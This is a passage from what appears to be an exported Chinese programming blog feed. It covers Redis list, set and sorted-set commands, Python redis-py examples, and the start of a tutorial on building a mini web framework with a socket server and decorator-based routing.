、c</code></p><blockquote><p>lpush a1 a b c</p></blockquote></li><li><p>在右侧插⼊数据</p><blockquote><p>rpush key value1 value2 …</p></blockquote></li><li><p>例2：从键为<code>a1</code>的列表右侧加⼊数据<code>0、1</code></p><blockquote><p>rpush a1 0 1</p></blockquote></li><li><p>在指定元素的前或后插⼊新元素</p><blockquote><p>linsert key before或after 现有元素 新元素</p></blockquote></li><li><p>例3：在键为<code>a1</code>的列表中元素<code>b</code>前加⼊<code>3</code></p><blockquote><p>linsert a1 before b 3</p></blockquote></li></ul><h4 id="获取-2"><a href="#获取-2" class="headerlink" title="获取"></a>获取</h4><ul><li><p>返回列表⾥指定范围内的元素</p><ul><li><code>start</code>、<code>stop</code>为元素的下标索引</li><li>索引从左侧开始，第⼀个元素为0</li><li>索引可以是负数，表示从尾部开始计数，如<code>-1</code>表示最后⼀个元素</li></ul><blockquote><p>lrange key start stop</p></blockquote></li><li><p>例4：获取键为<code>a1</code>的列表所有元素</p><blockquote><p>lrange a1 0 -1</p></blockquote></li></ul><h4 id="设置指定索引位置的元素值"><a href="#设置指定索引位置的元素值" class="headerlink" title="设置指定索引位置的元素值"></a>设置指定索引位置的元素值</h4><ul><li><p>索引从左侧开始，第⼀个元素为0</p></li><li><p>索引可以是负数，表示尾部开始计数，如<code>-1</code>表示最后⼀个元素</p><blockquote><p>lset key index value</p></blockquote></li><li><p>例5：修改键为<code>a1</code>的列表中下标为<code>1</code>的元素值为<code>z</code></p><blockquote><p>lset a 1 z</p></blockquote></li></ul><h4 id="删除-2"><a href="#删除-2" class="headerlink" title="删除"></a>删除</h4><ul><li><p>删除指定元素</p><ul><li>将列表中前<code>count</code>次出现的值为<code>value</code>的元素移除</li><li>count &gt; 0: 从头往尾移除</li><li>count &lt; 0: 从尾往头移除</li><li>count = 0: 移除所有</li></ul><blockquote><p>lrem key count value</p></blockquote></li><li><p>例6.1：向列表<code>a2</code>中加⼊元素<code>a、b、a、b、a、b</code></p><blockquote><p>lpush a2 a b a b a b</p></blockquote></li><li><p>例6.2：从<code>a2</code>列表右侧开始删除2个<code>b</code></p><blockquote><p>lrem a2 -2 b</p></blockquote></li><li><p>例6.3：查看列表<code>a2</code>的所有元素</p><blockquote><p>lrange a2 0 -1</p></blockquote></li></ul><h4 id="截取修剪"><a href="#截取修剪" class="headerlink" title="截取修剪"></a>截取修剪</h4><ul><li><p>修剪(截取) 在[start stop]区间内的元素,区间外的元素全部删除</p><blockquote><p>ltrim key start stop</p></blockquote></li></ul><h3 id="5-set"><a href="#5-set" class="headerlink" title="5.set"></a>5.set</h3><ul><li>⽆序集合</li><li>元素为string类型</li><li>元素具有唯⼀性，不重复</li><li>说明：对于集合没有修改操作</li></ul><h4 id="增加-1"><a href="#增加-1" class="headerlink" title="增加"></a>增加</h4><ul><li><p>添加元素</p><blockquote><p>sadd key member1 member2 …</p></blockquote></li><li><p>例1：向键<code>a3</code>的集合中添加元素<code>zhangsan</code>、<code>lisi</code>、<code>wangwu</code></p><blockquote><p>sadd a3 zhangsan sili wangwu</p></blockquote></li></ul><h4 id="获取-3"><a href="#获取-3" class="headerlink" title="获取"></a>获取</h4><ul><li><p>返回所有的元素</p><blockquote><p>smembers key</p></blockquote></li><li><p>例2：获取键<code>a3</code>的集合中所有元素</p><blockquote><p>smembers a3</p></blockquote></li></ul><h4 id="删除-3"><a href="#删除-3" class="headerlink" title="删除"></a>删除</h4><ul><li><p>删除指定元素</p><blockquote><p>srem key</p></blockquote></li><li><p>例3：删除键<code>a3</code>的集合中元素<code>wangwu</code></p><blockquote><p>srem a3 wangwu</p></blockquote></li></ul><h3 id="6-zset"><a href="#6-zset" class="headerlink" title="6.zset"></a>6.zset</h3><ul><li>sorted set，有序集合</li><li>元素为string类型</li><li>元素具有唯⼀性，不重复</li><li>每个元素都会关联⼀个double类型的score，表示权重，通过权重将元素从⼩到⼤排序</li><li>说明：没有修改操作</li></ul><h4 id="增加-2"><a href="#增加-2" class="headerlink" title="增加"></a>增加</h4><ul><li><p>添加</p><blockquote><p>zadd key score1 member1 score2 member2 …</p></blockquote></li><li><p>例1：向键<code>a4</code>的集合中添加元素<code>lisi</code>、<code>wangwu</code>、<code>zhaoliu</code>、<code>zhangsan</code>，权重分别为<code>4、5、6、3</code></p><blockquote><p>zadd a4 4 lisi 5 wangwu 6 zhaoliu 3 zhangsan</p></blockquote></li></ul><h4 id="获取-4"><a href="#获取-4" class="headerlink" title="获取"></a>获取</h4><ul><li><p>返回指定范围内的元素</p></li><li><p>start、stop为元素的下标索引</p></li><li><p>索引从左侧开始，第⼀个元素为0</p></li><li><p>索引可以是负数，表示从尾部开始计数，如<code>-1</code>表示最后⼀个元素</p><blockquote><p>zrange key start stop</p></blockquote></li><li><p>例2：获取键<code>a4</code>的集合中所有元素</p><blockquote><p>zrange a4 0 -1</p></blockquote></li><li><p>返回<code>score</code>值在<code>min</code>和<code>max</code>之间的成员</p><blockquote><p>zrangebyscore key min max</p></blockquote></li><li><p>例3：获取键<code>a4</code>的集合中权限值在<code>5和6之间</code>的成员</p><blockquote><p>zrangebyscore a4 5 6</p></blockquote></li><li><p>返回成员<code>member</code>的<code>score</code>值</p><blockquote><p>zscore key member</p></blockquote></li><li><p>例4：获取键<code>a4</code>的集合中元素<code>zhangsan</code>的权重</p><blockquote><p>zscore a4 zhangsan</p></blockquote></li></ul><h4 id="删除-4"><a href="#删除-4" class="headerlink" title="删除"></a>删除</h4><ul><li><p>删除指定元素</p><blockquote><p>zrem key member1 member2 …</p></blockquote></li><li><p>例5：删除集合<code>a4</code>中元素<code>zhangsan</code></p><blockquote><p>zrem a4 zhangsan</p></blockquote></li><li><p>删除权重在指定范围的元素</p><blockquote><p>zremrangebyscore key min max</p></blockquote></li><li><p>例6：删除集合<code>a4</code>中权限在<code>5、6之间</code>的元素</p><blockquote><p>zremrangebyscore a4 5 6</p></blockquote></li></ul><h2 id="五、与python交互"><a href="#五、与python交互" class="headerlink" title="五、与python交互"></a>五、与python交互</h2><h4 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h4><p>安装Redis的有3种方式<a href="https://github.com/andymccurdy/redis-py" target="_blank" rel="noopener">https://github.com/andymccurdy/redis-py</a></p><ul><li><p>第一种：进⼊虚拟环境，联⽹安装包redis</p><blockquote><p>pip install redis</p></blockquote></li><li><p>第二种：进⼊虚拟环境，联⽹安装包redis</p><blockquote><p>easy_install redis</p></blockquote></li><li><p>第三种：到中⽂官⽹-客户端下载redis包的源码，使⽤源码安装</p><blockquote><p>一步步执行 wget <a href="https://github.com/andymccurdy/redis-py/archive/master.zip" target="_blank" rel="noopener">https://github.com/andymccurdy/redis-py/archive/master.zip</a><br>unzip master.zip<br>cd redis-py-master<br>sudo python setup.py install</p></blockquote></li></ul><h4 id="调⽤模块"><a href="#调⽤模块" class="headerlink" title="调⽤模块"></a>调⽤模块</h4><ul><li><p>引⼊模块</p><blockquote><p>from redis import StrictRedis</p></blockquote></li><li><p>这个模块中提供了<code>StrictRedis对象</code>，⽤于连接redis服务器，并按照不同类型提供 了不同⽅法，进⾏交互操作</p></li></ul><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><ul><li>在桌面上创建redis目录</li><li>使用pycharm打开 redis目录</li><li>创建redis_string.py文件</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()    except Exception as e:        print(e)</code></pre><h4 id="string-增加"><a href="#string-增加" class="headerlink" title="string-增加"></a>string-增加</h4><ul><li>⽅法set，添加键、值，如果添加成功则返回True，如果添加失败则返回False</li><li>编写代码如下</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()        #添加键name，值为itheima        result=sr.set(&#39;name&#39;,&#39;itheima&#39;)        #输出响应结果，如果添加成功则返回True，否则返回False        print(result)    except Exception as e:        print(e)</code></pre><h4 id="string-获取"><a href="#string-获取" class="headerlink" title="string-获取"></a>string-获取</h4><ul><li>⽅法get，添加键对应的值，如果键存在则返回对应的值，如果键不存在则返回None</li><li>编写代码如下</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()        #获取键name的值        result = sr.get(&#39;name&#39;)        #输出键的值，如果键不存在则返回None        print(result)    except Exception as e:        print(e)</code></pre><h4 id="string-修改"><a href="#string-修改" class="headerlink" title="string-修改"></a>string-修改</h4><ul><li>⽅法set，如果键已经存在则进⾏修改，如果键不存在则进⾏添加</li><li>编写代码如下</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()        #设置键name的值，如果键已经存在则进⾏修改，如果键不存在则进⾏添加        result = sr.set(&#39;name&#39;,&#39;itcast&#39;)        #输出响应结果，如果操作成功则返回True，否则返回False        print(result)    except Exception as e:        print(e)</code></pre><h4 id="string-删除"><a href="#string-删除" class="headerlink" title="string-删除"></a>string-删除</h4><ul><li>⽅法delete，删除键及对应的值，如果删除成功则返回受影响的键数，否则则返 回0</li><li>编写代码如下</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()        #设置键name的值，如果键已经存在则进⾏修改，如果键不存在则进⾏添加        result = sr.delete(&#39;name&#39;)        #输出响应结果，如果删除成功则返回受影响的键数，否则则返回0        print(result)    except Exception as e:        print(e)</code></pre><h4 id="获取键"><a href="#获取键" class="headerlink" title="获取键"></a>获取键</h4><ul><li>⽅法keys，根据正则表达式获取键</li><li>编写代码如下</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()        #获取所有的键        result=sr.keys()        #输出响应结果，所有的键构成⼀个列表，如果没有键则返回空列表        print(result)    except Exception as e:        print(e)</code></pre><h3 id="StrictRedis对象⽅法"><a href="#StrictRedis对象⽅法" class="headerlink" title="StrictRedis对象⽅法"></a>StrictRedis对象⽅法</h3><ul><li>通过init创建对象，指定参数host、port与指定的服务器和端⼝连接，host默认为localhost，port默认为6379，db默认为0</li></ul><pre><code>sr = StrictRedis(host=&#39;localhost&#39;, port=6379, db=0)简写sr=StrictRedis()</code></pre><ul><li>根据不同的类型，拥有不同的实例⽅法可以调⽤，与前⾯学的redis命令对应，⽅法需要的参数与命令的参数⼀致</li></ul><h4 id="string"><a href="#string" class="headerlink" title="string"></a>string</h4><ul><li>set</li><li>setex</li><li>mset</li><li>append</li><li>get</li><li>mget</li><li>key</li></ul><h4 id="keys"><a href="#keys" class="headerlink" title="keys"></a>keys</h4><ul><li>exists</li><li>type</li><li>delete</li><li>expire</li><li>getrange</li><li>ttl</li></ul><h4 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h4><ul><li>hset</li><li>hmset</li><li>hkeys</li><li>hget</li><li>hmget</li><li>hvals</li><li>hdel</li></ul><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><ul><li>lpush</li><li>rpush</li><li>linsert</li><li>lrange</li><li>lset</li><li>lrem</li></ul><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><ul><li>sadd</li><li>smembers</li><li>srem</li></ul><h4 id="zset"><a href="#zset" class="headerlink" title="zset"></a>zset</h4><ul><li>zadd</li><li>zrange</li><li>zrangebyscore</li><li>zscore</li><li>zrem</li><li>zremrangebyscore</li></ul><h3 id="string-1"><a href="#string-1" class="headerlink" title="string"></a>string</h3><h4 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h4><ul><li>在桌面上创建redis目录</li><li>使用pycharm打开 redis目录</li><li>创建redis_string.py文件</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()    except Exception as e:        print(e)</code></pre><h4 id="string-增加-1"><a href="#string-增加-1" class="headerlink" title="string-增加"></a>string-增加</h4><ul><li>⽅法set，添加键、值，如果添加成功则返回True，如果添加失败则返回False</li><li>编写代码如下</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()        #添加键name，值为itheima        result=sr.set(&#39;name&#39;,&#39;itheima&#39;)        #输出响应结果，如果添加成功则返回True，否则返回False        print(result)    except Exception as e:        print(e)</code></pre><h4 id="string-获取-1"><a href="#string-获取-1" class="headerlink" title="string-获取"></a>string-获取</h4><ul><li>⽅法get，添加键对应的值，如果键存在则返回对应的值，如果键不存在则返回None</li><li>编写代码如下</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()        #获取键name的值        result = sr.get(&#39;name&#39;)        #输出键的值，如果键不存在则返回None        print(result)    except Exception as e:        print(e)</code></pre><h4 id="string-修改-1"><a href="#string-修改-1" class="headerlink" title="string-修改"></a>string-修改</h4><ul><li>⽅法set，如果键已经存在则进⾏修改，如果键不存在则进⾏添加</li><li>编写代码如下</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()        #设置键name的值，如果键已经存在则进⾏修改，如果键不存在则进⾏添加        result = sr.set(&#39;name&#39;,&#39;itcast&#39;)        #输出响应结果，如果操作成功则返回True，否则返回False        print(result)    except Exception as e:        print(e)</code></pre><h4 id="string-删除-1"><a href="#string-删除-1" class="headerlink" title="string-删除"></a>string-删除</h4><ul><li>⽅法delete，删除键及对应的值，如果删除成功则返回受影响的键数，否则则返 回0</li><li>编写代码如下</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()        #设置键name的值，如果键已经存在则进⾏修改，如果键不存在则进⾏添加        result = sr.delete(&#39;name&#39;)        #输出响应结果，如果删除成功则返回受影响的键数，否则则返回0        print(result)    except Exception as e:        print(e)</code></pre><h4 id="获取键-1"><a href="#获取键-1" class="headerlink" title="获取键"></a>获取键</h4><ul><li>⽅法keys，根据正则表达式获取键</li><li>编写代码如下</li></ul><pre><code class="python">from redis import *if __name__==&quot;__main__&quot;:    try:        #创建StrictRedis对象，与redis服务器建⽴连接        sr=StrictRedis()        #获取所有的键        result=sr.keys()        #输出响应结果，所有的键构成⼀个列表，如果没有键则返回空列表        print(result)    except Exception as e:        print(e)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级11-mini-Web框架</title>
      <link href="/2020/08/22/2020-08-23-python%E9%AB%98%E7%BA%A711-mini-Web%E6%A1%86%E6%9E%B6%20(%E6%8F%92%E5%9B%BE%E7%89%88)/"/>
      <url>/2020/08/22/2020-08-23-python%E9%AB%98%E7%BA%A711-mini-Web%E6%A1%86%E6%9E%B6%20(%E6%8F%92%E5%9B%BE%E7%89%88)/</url>
      
        <content type="html"><![CDATA[<h1 id="mini-Web框架"><a href="#mini-Web框架" class="headerlink" title="mini-Web框架"></a>mini-Web框架</h1><h2 id="一、web框架概述"><a href="#一、web框架概述" class="headerlink" title="一、web框架概述"></a>一、web框架概述</h2><h3 id="1-web框架和web服务器的关系介绍"><a href="#1-web框架和web服务器的关系介绍" class="headerlink" title="1. web框架和web服务器的关系介绍"></a>1. web框架和web服务器的关系介绍</h3><a id="more"></a><p><strong>使用web框架专门负责处理用户的动态资源请求，这个web框架其实就是一个为web服务器提供服务的应用程序</strong>，简称web框架。</p><p><img src="https://img-blog.csdnimg.cn/20200826140436159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>关系说明:</strong></p><ul><li>web服务器接收浏览器发起的请求，如果是动态资源请求找web框架来处理</li><li>web框架负责处理浏览器的动态资源请求，把处理的结果发生给web服务器</li><li>web服务器再把响应结果发生给浏览器</li></ul><h3 id="2-静态资源"><a href="#2-静态资源" class="headerlink" title="2. 静态资源"></a>2. 静态资源</h3><p>不需要经常变化的资源，这种资源web服务器可以提前准备好，比如: png/jpg/css/js等文件。</p><h3 id="3-动态资源"><a href="#3-动态资源" class="headerlink" title="3. 动态资源"></a>3. 动态资源</h3><p>和静态资源相反, 这种资源会经常变化，比如: 我们在京东浏览商品时经常会根据条件进行筛选，选择不同条件, 浏览的商品就不同，这种资源web服务器无法提前准备好，需要web框架来帮web服务器进行准备，在这里web服务器可以把.html的资源请求认为是动态资源请求交由web框架进行处理。</p><h3 id="4-WSGI协议"><a href="#4-WSGI协议" class="headerlink" title="4. WSGI协议"></a>4. WSGI协议</h3><p>它是web服务器和web框架之间进行协同工作的一个规则，WSGI协议规定web服务器把动态资源的请求信息传给web框架处理，web框架把处理好的结果返回给web服务器。</p><h3 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h3><ul><li>web框架是专门为web服务器处理动态资源请求的一个应用程序</li><li>web框架和web服务器的关系是web框架专门服务于web服务器，给web服务器提供处理动态资源请求的服务。</li></ul><h2 id="二、框架程序开发"><a href="#二、框架程序开发" class="headerlink" title="二、框架程序开发"></a>二、框架程序开发</h2><h3 id="1-框架职责介绍"><a href="#1-框架职责介绍" class="headerlink" title="1. 框架职责介绍"></a>1. 框架职责介绍</h3><ul><li>接收web服务器的动态资源请求，给web服务器提供处理动态资源请求的服务。</li></ul><h3 id="2-动态资源判断"><a href="#2-动态资源判断" class="headerlink" title="2. 动态资源判断"></a>2. 动态资源判断</h3><ul><li>根据请求资源路径的后缀名进行判断<ul><li>如果请求资源路径的后缀名是.html则是动态资源请求, 让web框架程序进行处理。</li><li>否则是静态资源请求，让web服务器程序进行处理。</li></ul></li></ul><p><strong>web服务器程序(web.py)代码:</strong></p><pre><code class="python">import socketimport threadingimport sysimport framework# 定义web服务器类class HttpWebServer(object):    def __init__(self, port):        # 创建tcp服务端套接字        tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # 设置端口号复用, 程序退出端口立即释放        tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)        # 绑定端口号        tcp_server_socket.bind((&quot;&quot;, port))        # 设置监听        tcp_server_socket.listen(128)        self.tcp_server_socket = tcp_server_socket    # 处理客户的请求    @staticmethod    def handle_client_quest(new_socket):        # 代码执行到此，说明连接建立成功        recv_client_data = new_socket.recv(4096)        if len(recv_client_data) == 0:            print(&quot;关闭浏览器了&quot;)            # 关闭服务与客户端的套接字            new_socket.close()            return        # 对二进制数据进行解码        recv_client_content = recv_client_data.decode(&quot;utf-8&quot;)        print(recv_client_content)        # 根据指定字符串进行分割， 最大分割次数指定2        request_list = recv_client_content.split(&quot; &quot;, maxsplit=2)        # 获取请求资源路径        request_path = request_list[1]        print(request_path)        # 判断请求的是否是根目录，如果条件成立，指定首页数据返回        if request_path == &quot;/&quot;:            request_path = &quot;/index.html&quot;        # 判断是否是动态资源请求        if request_path.endswith(&quot;.html&quot;):            &quot;&quot;&quot;这里是动态资源请求，把请求信息交给框架处理&quot;&quot;&quot;            # 字典存储用户的请求信息            env = {                &quot;request_path&quot;: request_path            }            # 获取处理结果            status, headers, response_body = framework.handle_request(env)            # 使用框架处理的数据拼接响应报文            # 响应行            response_line = &quot;HTTP/1.1 %s\r\n&quot; % status            # 响应头            response_header = &quot;&quot;            # 遍历头部信息            for header in headers:                # 拼接多个响应头                response_header += &quot;%s: %s\r\n&quot; % header            response_data = (response_line +                             response_header +                             &quot;\r\n&quot; +                             response_body).encode(&quot;utf-8&quot;)            # 发送数据            new_socket.send(response_data)            # 关闭socket            new_socket.close()        else:            &quot;&quot;&quot;这里是静态资源请求&quot;&quot;&quot;            try:                # 动态打开指定文件                with open(&quot;static&quot; + request_path, &quot;rb&quot;) as file:                    # 读取文件数据                    file_data = file.read()            except Exception as e:                # 请求资源不存在，返回404数据                # 响应行                response_line = &quot;HTTP/1.1 404 Not Found\r\n&quot;                # 响应头                response_header = &quot;Server: PWS1.0\r\n&quot;                with open(&quot;static/error.html&quot;, &quot;rb&quot;) as file:                    file_data = file.read()                # 响应体                response_body = file_data                # 拼接响应报文                response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body                # 发送数据                new_socket.send(response_data)            else:                # 响应行                response_line = &quot;HTTP/1.1 200 OK\r\n&quot;                # 响应头                response_header = &quot;Server: PWS1.0\r\n&quot;                # 响应体                response_body = file_data                # 拼接响应报文                response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body                # 发送数据                new_socket.send(response_data)            finally:                # 关闭服务与客户端的套接字                new_socket.close()    def start(self):        while True:            # 等待接受客户端的连接请求            new_socket, ip_port = self.tcp_server_socket.accept()            sub_thread = threading.Thread(target=self.handle_client_quest, args=(new_socket,))            # 设置守护线程            sub_thread.setDaemon(True)            sub_thread.start()# 程序入口函数def main():    # 获取命令行参数判断长度    if len(sys.argv) != 2:        print(&quot;执行命令如下: python3 xxx.py 9000&quot;)        return    # 判断端口号是否是数字    if not sys.argv[1].isdigit():        print(&quot;执行命令如下: python3 xxx.py 9000&quot;)        return    # 需要转成int类型    port = int(sys.argv[1])    # 创建web服务器    web_server = HttpWebServer(port)    # 启动web服务器    web_server.start()if __name__ == &#39;__main__&#39;:    main()</code></pre><h3 id="3-处理客户端的动态资源请求"><a href="#3-处理客户端的动态资源请求" class="headerlink" title="3. 处理客户端的动态资源请求"></a>3. 处理客户端的动态资源请求</h3><ol><li>创建web框架程序</li><li>接收web服务器的动态资源请求</li><li>处理web服务器的动态资源请求并把处理结果返回给web服务器</li><li>web服务器把处理结果组装成响应报文发送给浏览器</li></ol><p><strong>web框架程序(framework.py)代码:</strong></p><pre><code class="python">&quot;&quot;&quot;miniweb框架，负责处理动态资源请求&quot;&quot;&quot;import time# 获取首页数据def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 处理后的数据    data = time.ctime()    return status, response_header, data# 没有找到动态资源def not_found():    # 响应状态    status = &quot;404 Not Found&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 处理后的数据    data = &quot;not found&quot;    return status, response_header, data# 处理动态资源请求def handle_request(env):    # 获取动态请求资源路径    request_path = env[&quot;request_path&quot;]    print(&quot;接收到的动态资源请求:&quot;, request_path)    if request_path == &quot;/index.html&quot;:        # 获取首页数据        result = index()        return result    else:        # 没有找到动态资源        result = not_found()        return result</code></pre><h3 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h3><ul><li>动态资源的判断通过请求资源路径的后缀是.html来完成，否则是静态资源</li><li>处理客户端的动态资源请求<ol><li>接收web服务器的动态资源请求</li><li>处理动态资源请求并把处理结果返回给web服务器</li><li>web服务器把处理结果组装成响应报文发送给浏览器</li></ol></li></ul><h2 id="三、模板替换功能开发"><a href="#三、模板替换功能开发" class="headerlink" title="三、模板替换功能开发"></a>三、模板替换功能开发</h2><h3 id="1-读取股票信息模板文件"><a href="#1-读取股票信息模板文件" class="headerlink" title="1. 读取股票信息模板文件"></a>1. 读取股票信息模板文件</h3><p><strong>framework.py示例代码:</strong></p><pre><code class="python"># 获取首页数据def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/index.html&quot;, &quot;r&quot;) as file:        file_data = file.read()</code></pre><h3 id="2-使用模拟数据替换模板变量"><a href="#2-使用模拟数据替换模板变量" class="headerlink" title="2. 使用模拟数据替换模板变量"></a>2. 使用模拟数据替换模板变量</h3><p><strong>framework.py示例代码:</strong></p><pre><code class="python"># 获取首页数据def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 1. 打开模板文件，读取数据    with open(&quot;template/index.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    data = time.ctime()    # 2. 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, data)    return status, response_header, result</code></pre><h3 id="3-小结"><a href="#3-小结" class="headerlink" title="3. 小结"></a>3. 小结</h3><ul><li>模板替换功能<ol><li>打开template目录下的index.html模板文件，读取模板文件数据</li><li>把模板文件中的模板变量进行替换</li></ol></li></ul><h2 id="四、路由列表功能开发"><a href="#四、路由列表功能开发" class="headerlink" title="四、路由列表功能开发"></a>四、路由列表功能开发</h2><h3 id="1-路由的介绍"><a href="#1-路由的介绍" class="headerlink" title="1. 路由的介绍"></a>1. 路由的介绍</h3><p>接着上面程序的判断场景，假如咱们再处理一个个人中心的动态资源请求非常简单，再添加一个函数和更加一个分支判断就可以实现了。</p><p><strong>framework.py 示例代码:</strong></p><pre><code class="python"># 获取个人中心数据def center():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/center.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    data = time.ctime()    # 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, data)    return status, response_header, result# 处理动态资源请求def handle_request(env):    # 获取动态请求资源路径    request_path = env[&quot;request_path&quot;]    print(&quot;接收到的动态资源请求:&quot;, request_path)    if request_path == &quot;/index.html&quot;:        # 获取首页数据        result = index()        return result    elif request_path == &quot;/center.html&quot;:        # 获取个人中心数据        result = center()        return result    else:        # 没有找到动态资源        result = not_found()        return result</code></pre><p>那如果咱们的框架处理的页面请求路径再多一些，比如:5个路径判断，大家可能感觉条件分支完全可以胜任，如果是40个甚至更多呢? 如果这是还是用普通的条件分支简直无法忍受。</p><p>解决办法: <strong>可以使用路由</strong></p><p><strong>什么是路由？</strong></p><p>路由就是请求的URL到处理函数的映射，也就是说提前把请求的URL和处理函数关联好。</p><p><strong>路由列表</strong></p><p>这么多的路由如何管理呢， 可以使用一个路由列表进行管理，通过路由列表保存每一个路由。</p><table><thead><tr><th align="left">请求路径</th><th align="left">处理函数</th></tr></thead><tbody><tr><td align="left">/login.html</td><td align="left">login函数</td></tr><tr><td align="left">/index.html</td><td align="left">index函数</td></tr><tr><td align="left">/center.html</td><td align="left">center函数</td></tr></tbody></table><h3 id="2-在路由列表添加路由"><a href="#2-在路由列表添加路由" class="headerlink" title="2. 在路由列表添加路由"></a>2. 在路由列表添加路由</h3><p><strong>framework.py 示例代码:</strong></p><pre><code class="python"># 定义路由列表route_list = [    (&quot;/index.html&quot;, index),    (&quot;/center.html&quot;, center)]</code></pre><h3 id="3-根据用户请求遍历路由列表处理用户请求"><a href="#3-根据用户请求遍历路由列表处理用户请求" class="headerlink" title="3. 根据用户请求遍历路由列表处理用户请求"></a>3. 根据用户请求遍历路由列表处理用户请求</h3><p><strong>framework.py 示例代码:</strong></p><pre><code class="python"># 处理动态资源请求def handle_request(env):    # 获取动态请求资源路径    request_path = env[&quot;request_path&quot;]    print(&quot;接收到的动态资源请求:&quot;, request_path)    # 遍历路由列表，选择执行的函数    for path, func in route_list:        if request_path == path:            result = func()            return result    else:        # 没有找到动态资源        result = not_found()        return result    # if request_path == &quot;/index.html&quot;:    #     # 获取首页数据    #     result = index()    #     return result    # elif request_path == &quot;/center.html&quot;:    #     # 获取个人中心数据    #     result = center()    #     return result    # else:    #     # 没有找到动态资源    #     result = not_found()    #     return result</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>路由是请求的URL到处理函数的映射</li><li>路由列表是用来保存每一个设置好的路由</li><li>用户的动态资源请求通过遍历路由列表找到对应的处理函数来完成。</li></ul><h2 id="五、装饰器方式的添加路由"><a href="#五、装饰器方式的添加路由" class="headerlink" title="五、装饰器方式的添加路由"></a>五、装饰器方式的添加路由</h2><h3 id="1-使用带有参数的装饰器添加路由"><a href="#1-使用带有参数的装饰器添加路由" class="headerlink" title="1. 使用带有参数的装饰器添加路由"></a>1. 使用带有参数的装饰器添加路由</h3><p>前面我们已经实现了路由列表，但是每次添加路由都需要手动添加来完成，接下来我们想要完成路由的自动添加，可以通过装饰器来实现，在使用装饰器对处理函数进行装饰的时候我们需要知道装饰的函数和那个请求路径进行关联，也就是说装饰器需要接收一个url参数，这样我们定义的装饰器是一个带有参数的装饰器。</p><p><strong>示例代码:</strong></p><pre><code class="python">&quot;&quot;&quot;miniweb框架，负责处理动态资源请求&quot;&quot;&quot;import time# 定义路由列表route_list = []# 定义带有参数的装饰器def route(path):    # 装饰器    def decorator(func):        # 当执行装饰器装饰指定函数的时候，把路径和函数添加到路由列表        route_list.append((path, func))        def inner():            # 执行指定函数            return func()        return inner    # 返回装饰器    return decorator# 获取首页数据@route(&quot;/index.html&quot;)def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/index.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    data = time.ctime()    # 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, data)    return status, response_header, result# 